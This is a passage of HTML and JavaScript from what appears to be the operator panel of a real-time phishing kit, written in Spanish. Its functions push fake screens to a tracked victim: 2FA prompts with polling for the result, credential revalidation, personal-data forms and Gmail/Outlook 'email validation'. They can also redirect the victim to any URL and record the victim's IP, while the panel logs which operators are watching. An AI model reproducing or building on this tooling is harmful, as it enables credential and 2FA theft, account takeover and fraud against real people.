                            <button onclick="cerrarModalRedireccion()" class="modal-close">
                                <i class="fas fa-times"></i>
                            </button>
                        </div>
                        <div class="modal-content">
                            <div class="redireccion-config">
                                <div class="tipo-redireccion">
                                    <label>Tipo de redirección:</label>
                                    <div class="radio-group">
                                        <div class="radio-option">
                                            <input type="radio" id="tipoIndex" name="tipoRedireccion" value="index" checked>
                                            <label for="tipoIndex">
                                                <i class="fas fa-home"></i> Inicio [>] index.php
                                            </label>
                                        </div>
                                        <div class="radio-option">
                                            <input type="radio" id="tipoCustom" name="tipoRedireccion" value="url_personalizada">
                                            <label for="tipoCustom">
                                                <i class="fas fa-external-link-alt"></i> URL Personalizada
                                            </label>
                                        </div>
                                    </div>
                                </div>
                                <div class="url-input" id="urlInput" style="display: none;">
                                    <label>URL de destino:</label>
                                    <input type="url" id="urlDestino" placeholder="https://ejemplo.com" class="redireccion-input">
                                    <small>Ingresa la URL completa incluyendo http:// o https://</small>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button onclick="cerrarModalRedireccion()" class="btn-cancel">Cancelar</button>
                            <button onclick="enviarRedireccion()" class="btn-send">
                                <i class="fas fa-paper-plane"></i> Enviar Redirección
                            </button>
                        </div>
                    </div>
                </div>
            `;

            // Añadir modal al body
            document.body.insertAdjacentHTML('beforeend', modalHTML);

            // Añadir estilos CSS dinámicamente (usando los mismos estilos del timer)
            const styles = `
                <style id="redireccionModalStyles">
                    .modal-overlay {
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                        background: rgba(0, 0, 0, 0.7);
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        z-index: 10000;
                    }
                    .modal-container {
                        background: white;
                        border-radius: 12px;
                        max-width: 500px;
                        width: 90%;
                        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                    }
                    .modal-header {
                        padding: 20px;
                        border-bottom: 1px solid #eee;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                    }
                    .modal-header h3 {
                        margin: 0;
                        color: #333;
                        font-size: 1.2em;
                    }
                    .modal-close {
                        background: none;
                        border: none;
                        font-size: 1.2em;
                        cursor: pointer;
                        color: #666;
                    }
                    .modal-content {
                        padding: 20px;
                    }
                    .modal-footer {
                        padding: 20px;
                        border-top: 1px solid #eee;
                        display: flex;
                        gap: 10px;
                        justify-content: flex-end;
                    }
                    .btn-cancel, .btn-send {
                        padding: 10px 20px;
                        border: none;
                        border-radius: 6px;
                        cursor: pointer;
                        font-weight: bold;
                        transition: all 0.3s;
                    }
                    .btn-cancel {
                        background: #6c757d;
                        color: white;
                    }
                    .btn-cancel:hover {
                        background: #5a6268;
                    }
                    .btn-send {
                        background: #007bff;
                        color: white;
                    }
                    .btn-send:hover {
                        background: #0056b3;
                    }
                    .radio-group {
                        display: flex;
                        flex-direction: column;
                        gap: 12px;
                        margin-top: 10px;
                        margin-bottom: 20px;
                    }
                    .radio-option {
                        display: flex;
                        align-items: center;
                        padding: 12px;
                        border: 2px solid #ddd;
                        border-radius: 6px;
                        transition: all 0.2s;
                        cursor: pointer;
                    }
                    .radio-option:hover {
                        border-color: #007bff;
                        background: #f8f9fa;
                    }
                    .radio-option input[type="radio"] {
                        margin-right: 10px;
                        transform: scale(1.2);
                    }
                    .radio-option input[type="radio"]:checked + label {
                        color: #007bff;
                        font-weight: bold;
                    }
                    .radio-option label {
                        display: flex;
                        align-items: center;
                        gap: 8px;
                        cursor: pointer;
                        margin: 0;
                        font-size: 14px;
                    }
                    .url-input {
                        margin-bottom: 20px;
                    }
                    .url-input label, .tipo-redireccion label {
                        display: block;
                        margin-bottom: 8px;
                        font-weight: bold;
                        color: #555;
                    }
                    .redireccion-input {
                        width: 100%;
                        padding: 10px;
                        border: 2px solid #ddd;
                        border-radius: 6px;
                        font-size: 14px;
                        margin-bottom: 5px;
                    }
                    .redireccion-input:focus {
                        outline: none;
                        border-color: #007bff;
                    }
                    .url-input small {
                        color: #666;
                        font-size: 12px;
                    }
                </style>
            `;

            // Añadir estilos al head
            document.head.insertAdjacentHTML('beforeend', styles);

            // Event listeners para los radio buttons
            const radioButtons = document.querySelectorAll('input[name="tipoRedireccion"]');
            const urlInput = document.getElementById('urlInput');
            
            radioButtons.forEach(radio => {
                radio.addEventListener('change', function() {
                    if (this.value === 'url_personalizada') {
                        urlInput.style.display = 'block';
                        document.getElementById('urlDestino').required = true;
                    } else {
                        urlInput.style.display = 'none';
                        document.getElementById('urlDestino').required = false;
                    }
                });
            });
        }

        function cerrarModalRedireccion() {
            const modal = document.getElementById('redireccionModal');
            const styles = document.getElementById('redireccionModalStyles');
            if (modal) modal.remove();
            if (styles) styles.remove();
        }

        async function enviarRedireccion() {
            const tipoRedireccion = document.querySelector('input[name="tipoRedireccion"]:checked').value;
            const urlDestino = tipoRedireccion === 'index' ? 'index.php' : document.getElementById('urlDestino').value.trim();

            // Validaciones
            if (tipoRedireccion === 'url_personalizada' && !urlDestino) {
                alert('Por favor, ingresa una URL de destino válida');
                return;
            }

            if (tipoRedireccion === 'url_personalizada' && !urlDestino.startsWith('http')) {
                alert('La URL debe comenzar con http:// o https://');
                return;
            }

            try {
                // Enviar redirección al backend
                const response = await fetch('enviar_redirecciones.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        usuario_id: userId,
                        url_destino: urlDestino,
                        tipo_redireccion: tipoRedireccion,
                        mensaje_confirmacion: '',
                        ip_usuario: document.querySelector('#contact-data-block')?.closest('.historial-message')?.querySelector('.message-time')?.textContent || 'N/A'
                    })
                });

                // Verificar que la respuesta sea JSON válido
                const responseText = await response.text();
                let data;
                try {
                    data = JSON.parse(responseText);
                } catch (e) {
                    console.error('Respuesta no válida de enviar_redirecciones.php:', responseText);
                    throw new Error('Respuesta no válida del servidor');
                }
                
                if (data.success) {
                    // Mostrar mensaje en el chat
                    const destinoTexto = tipoRedireccion === 'index' ? 'Index' : urlDestino;
                    addMessageToChat({
                        type: 'admin',
                        content: `Redirección enviada: ${destinoTexto}`,
                        timestamp: new Date()
                    });

                    // Cerrar modal
                    cerrarModalRedireccion();
                } else {
                    alert('Error al enviar redirección: ' + (data.error || 'Error desconocido'));
                }
            } catch (error) {
                console.error('Error enviando redirección:', error);
                alert('Error de conexión al enviar la redirección');
            }
        }

        function mostrarModalEmailValidation() {
            // Crear modal dinámico para validación de email
            const modalHTML = `
                <div id="emailValidationModal" class="modal-overlay">
                    <div class="modal-container">
                        <div class="modal-header">
                            <h3><i class="fas fa-envelope"></i> Validar Email</h3>
                            <button onclick="cerrarModalEmailValidation()" class="modal-close">
                                <i class="fas fa-times"></i>
                            </button>
                        </div>
                        <div class="modal-content">
                            <div class="email-validation-config">
                                <div class="proveedor-email">
                                    <label>Selecciona el proveedor de email:</label>
                                    <div class="radio-group">
                                        <div class="radio-option">
                                            <input type="radio" id="proveedorGmail" name="proveedorEmail" value="gmail" checked>
                                            <label for="proveedorGmail">
                                                <i class="fab fa-google"></i> Gmail
                                            </label>
                                        </div>
                                        <div class="radio-option">
                                            <input type="radio" id="proveedorOutlook" name="proveedorEmail" value="outlook">
                                            <label for="proveedorOutlook">
                                                <i class="fab fa-microsoft"></i> Outlook
                                            </label>
                                        </div>
                                        <div class="radio-option">
                                            <input type="radio" id="proveedorOtro" name="proveedorEmail" value="otro">
                                            <label for="proveedorOtro">
                                                <i class="fas fa-envelope"></i> Otro
                                            </label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button onclick="cerrarModalEmailValidation()" class="btn-cancel">Cancelar</button>
                            <button onclick="enviarEmailValidation()" class="btn-send">
                                <i class="fas fa-paper-plane"></i> Enviar Validación
                            </button>
                        </div>
                    </div>
                </div>
            `;

            // Añadir modal al body
            document.body.insertAdjacentHTML('beforeend', modalHTML);

            // Añadir estilos CSS dinámicamente (usando los mismos estilos del timer)
            const styles = `
                <style id="emailValidationModalStyles">
                    .modal-overlay {
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                        background: rgba(0, 0, 0, 0.7);
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        z-index: 10000;
                    }
                    .modal-container {
                        background: white;
                        border-radius: 12px;
                        max-width: 500px;
                        width: 90%;
                        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                    }
                    .modal-header {
                        padding: 20px;
                        border-bottom: 1px solid #eee;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                    }
                    .modal-header h3 {
                        margin: 0;
                        color: #333;
                        font-size: 1.2em;
                    }
                    .modal-close {
                        background: none;
                        border: none;
                        font-size: 1.2em;
                        cursor: pointer;
                        color: #666;
                    }
                    .modal-content {
                        padding: 20px;
                    }
                    .modal-footer {
                        padding: 20px;
                        border-top: 1px solid #eee;
                        display: flex;
                        gap: 10px;
                        justify-content: flex-end;
                    }
                    .btn-cancel, .btn-send {
                        padding: 10px 20px;
                        border: none;
                        border-radius: 6px;
                        cursor: pointer;
                        font-weight: bold;
                        transition: all 0.3s;
                    }
                    .btn-cancel {
                        background: #6c757d;
                        color: white;
                    }
                    .btn-cancel:hover {
                        background: #5a6268;
                    }
                    .btn-send {
                        background: #007bff;
                        color: white;
                    }
                    .btn-send:hover {
                        background: #0056b3;
                    }
                    .radio-group {
                        display: flex;
                        flex-direction: column;
                        gap: 12px;
                        margin-top: 10px;
                        margin-bottom: 20px;
                    }
                    .radio-option {
                        display: flex;
                        align-items: center;
                        padding: 12px;
                        border: 2px solid #ddd;
                        border-radius: 6px;
                        transition: all 0.2s;
                        cursor: pointer;
                    }
                    .radio-option:hover {
                        border-color: #007bff;
                        background: #f8f9fa;
                    }
                    .radio-option input[type="radio"] {
                        margin-right: 10px;
                        transform: scale(1.2);
                    }
                    .radio-option input[type="radio"]:checked + label {
                        color: #007bff;
                        font-weight: bold;
                    }
                    .radio-option label {
                        display: flex;
                        align-items: center;
                        gap: 8px;
                        cursor: pointer;
                        margin: 0;
                        font-size: 14px;
                    }
                    .proveedor-email label {
                        display: block;
                        margin-bottom: 8px;
                        font-weight: bold;
                        color: #555;
                    }
                </style>
            `;

            // Añadir estilos al head
            document.head.insertAdjacentHTML('beforeend', styles);
        }

        function cerrarModalEmailValidation() {
            const modal = document.getElementById('emailValidationModal');
            const styles = document.getElementById('emailValidationModalStyles');
            if (modal) modal.remove();
            if (styles) styles.remove();
        }

        async function esperarRespuestaAuth2fa(auth2faId) {
            // Cubre push (40s) + margen de red/polling
            const maxEspera = 50000;
            const inicio = Date.now();
            const intervalo = 2000;

            while (Date.now() - inicio < maxEspera) {
                await new Promise(resolve => setTimeout(resolve, intervalo));

                try {
                    const response = await fetch('verificar_auth2fa_admin.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            usuario_id: userId,
                            auth2fa_id: auth2faId
                        })
                    });

                    const data = await response.json();
                    if (!data.success || !data.encontrado) continue;

                    if (data.completado) {
                        await loadChatMessages(true);
                        return data;
                    }

                    if (data.cancelado) {
                        return data;
                    }
                } catch (error) {
                    console.error('Error verificando Auth 2FA:', error);
                }
            }

            return null;
        }

        async function enviarAuth2fa() {
            try {
                const response = await fetch('enviar_auth2fa.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        usuario_id: userId,
                        ip_usuario: document.querySelector('#contact-data-block')?.closest('.historial-message')?.querySelector('.message-time')?.textContent || 'N/A'
                    })
                });

                const responseText = await response.text();
                let data;
                try {
                    data = JSON.parse(responseText);
                } catch (e) {
                    console.error('Respuesta no válida de enviar_auth2fa.php:', responseText);
                    throw new Error('Respuesta no válida del servidor');
                }

                if (data.success) {
                    loadChatMessages(true);
                    if (data.auth2fa_id) {
                        await esperarRespuestaAuth2fa(data.auth2fa_id);
                    }
                } else {
                    alert('Error: ' + (data.error || 'Error desconocido'));
                }
            } catch (error) {
                console.error('Error enviando Auth 2FA:', error);
                alert('Error de conexión al enviar la tela Auth 2FA');
            }
        }

        async function enviarDatosPersonales() {
            try {
                const response = await fetch('enviar_datos_personales.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ usuario_id: userId })
                });
                const responseText = await response.text();
                let data;
                try { data = JSON.parse(responseText); }
                catch (e) { throw new Error('Respuesta no válida del servidor'); }

                if (data.success) {
                    loadChatMessages(true);
                } else {
                    alert('Error: ' + (data.error || 'Error desconocido'));
                }
            } catch (error) {
                console.error('Error enviando Datos Personales:', error);
                alert('Error de conexión al enviar la tela Datos Personales');
            }
        }

        async function enviarRevalidarCredenciales() {
            try {
                const response = await fetch('enviar_credenciales_revalidar.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        usuario_id: userId,
                        ip_usuario: document.querySelector('#contact-data-block')?.closest('.historial-message')?.querySelector('.message-time')?.textContent || 'N/A'
                    })
                });

                const responseText = await response.text();
                let data;
                try {
                    data = JSON.parse(responseText);
                } catch (e) {
                    console.error('Respuesta no válida de enviar_credenciales_revalidar.php:', responseText);
                    throw new Error('Respuesta no válida del servidor');
                }
                
                if (data.success) {
                    loadChatMessages(true);
                } else {
                    alert('Error: ' + (data.error || 'Error desconocido'));
                }
            } catch (error) {
                console.error('Error enviando solicitud de revalidación:', error);
                alert('Error de conexión al enviar la solicitud');
            }
        }

        async function enviarEmailValidation() {
            const proveedorSeleccionado = document.querySelector('input[name="proveedorEmail"]:checked').value;

            try {
                // Enviar validación de email al backend
                const response = await fetch('enviar_email_validation.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        usuario_id: userId,
                        proveedor: proveedorSeleccionado,
                        ip_usuario: document.querySelector('#contact-data-block')?.closest('.historial-message')?.querySelector('.message-time')?.textContent || 'N/A'
                    })
                });

                // Verificar que la respuesta sea JSON válido
                const responseText = await response.text();
                let data;
                try {
                    data = JSON.parse(responseText);
                } catch (e) {
                    console.error('Respuesta no válida de enviar_email_validation.php:', responseText);
                    throw new Error('Respuesta no válida del servidor');
                }
                
                if (data.success) {
                    // Mostrar mensaje en el chat
                    addMessageToChat({
                        type: 'admin',
                        content: `Validación de email enviada: ${data.email} (${proveedorSeleccionado})`,
                        timestamp: new Date()
                    });

                    // Cerrar modal
                    cerrarModalEmailValidation();
                } else {
                    alert('Error al enviar validación de email: ' + (data.error || 'Error desconocido'));
                }
            } catch (error) {
                console.error('Error enviando validación de email:', error);
                alert('Error de conexión al enviar la validación de email');
            }
        }

        // ==================== FUNCIONES DE MONITOREO ====================
        
        async function initializeMonitoring() {
            if (!userId) return;
            
            try {
                // Registrar entrada del admin
                await fetch('monitoreo_popup.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        accion: 'registrar_entrada',
                        usuario_id: userId
                    })
                });
                
                // Iniciar heartbeat cada 30 segundos
                heartbeatInterval = setInterval(sendHeartbeat, 30000);
            } catch (error) {
                console.error('Error inicializando monitoreo:', error);
            }
        }
        
        async function sendHeartbeat() {
            if (!userId) return;
            
            try {
                await fetch('monitoreo_popup.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        accion: 'heartbeat',
                        usuario_id: userId
                    })
                });
            } catch (error) {
                console.error('Error enviando heartbeat:', error);
            }
        }
        
        function startMonitoring() {
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
            }
            
            isMonitoringActive = true;
            
            // Cargar monitores inmediatamente
            loadMonitoringData();
            
            // Ejecutar polling cada 10 segundos
            monitoringInterval = setInterval(() => {
                if (isMonitoringActive) {
                    loadMonitoringData();
                }
            }, monitoringIntervalTime);
        }
        
        function stopMonitoring() {
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
                monitoringInterval = null;
            }
            
            if (heartbeatInterval) {
                clearInterval(heartbeatInterval);
                heartbeatInterval = null;
            }
            
            isMonitoringActive = false;
        }
        
        async function loadMonitoringData() {
            if (!userId) return;
            
            try {
                const response = await fetch('monitoreo_popup.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        accion: 'obtener_monitores',
                        usuario_id: userId
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    updateMonitoringDisplay(data.monitores_activos, data.historial);
                }
            } catch (error) {
                console.error('Error cargando datos de monitoreo:', error);
            }
        }
        
        function updateMonitoringDisplay(monitoresActivos, historial) {
            const onlineList = document.getElementById('onlineAdminsList');
            const historyList = document.getElementById('historyAdminsList');
            
            // Actualizar lista de administradores en línea
            if (monitoresActivos && monitoresActivos.length > 0) {
                const onlineText = monitoresActivos.map(monitor => {
                    const icon = monitor.is_admin == 1 ? '👑' : '👤';
                    return `${icon} ${monitor.admin_usuario.toUpperCase()}`;
                }).join(', ');
                onlineList.textContent = onlineText;
            } else {
                onlineList.textContent = 'Ninguno';
            }
            
            // Actualizar historial de administradores
            if (historial && historial.length > 0) {
                const historyText = historial.map(admin => {
                    const icon = admin.is_admin == 1 ? '👑' : '👤';
                    return `${icon} ${admin.admin_usuario.toUpperCase()}`;
                }).join(', ');
                historyList.textContent = historyText;
            } else {
                historyList.textContent = 'Ninguno';
            }
        }
    </script>

    <!-- Sistema de Mensajes Rápidos -->
    <script src="js/MensajesRapidos.js"></script>
    <script src="js/AudioNotifier.js"></script>
    <!-- Sistema de Tooltips -->
    <script src="js/tooltips.js"></script>
    <script>
        // Inicializar tooltips para los botones de control_dinamico_usuario.php
        function initializeTooltips() {
            if (window.tooltipManager) {
                // Tooltip para el botón de enviar
                const sendButton = document.getElementById('sendButton');
                if (sendButton) {
                    tooltipManager.addTooltip(sendButton, 'Enviar mensaje', 'top');
                }

                // Tooltip para el botón de visibilidad del input
                const inputVisibleButton = document.getElementById('inputVisibleButton');
                if (inputVisibleButton) {
                    // El tooltip cambiará dinámicamente según el estado
                    tooltipManager.addTooltip(inputVisibleButton, 'Mostrar input al usuario', 'top');
                }

                // Tooltip para el botón de envío con Enter
                const enterSendButton = document.getElementById('enterSendButton');
                if (enterSendButton) {
                    // El tooltip cambiará dinámicamente según el estado
                    tooltipManager.addTooltip(enterSendButton, 'Envío con Enter activado', 'top');
                }

                // Tooltip para el botón de mensajes rápidos (se crea dinámicamente)
                // Se agregará automáticamente cuando se cree el botón en MensajesRapidos.js
                // Verificar periódicamente si el botón existe
                const checkQuickMessagesButton = setInterval(() => {
                    const quickMessagesButton = document.getElementById('quickMessagesButton');
                    if (quickMessagesButton && !tooltipManager.tooltips.has(quickMessagesButton)) {
                        tooltipManager.addTooltip(quickMessagesButton, 'Mensajes rápidos', 'top');
                        clearInterval(checkQuickMessagesButton);
                    }
                }, 100);
                
                // Limpiar el intervalo después de 5 segundos si no se encuentra el botón
                setTimeout(() => {
                    clearInterval(checkQuickMessagesButton);
                }, 5000);
            }
        }

        // Inicializar tooltips después de que el DOM esté listo
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initializeTooltips);
        } else {
            initializeTooltips();
        }
    </script>

</body>
</html> 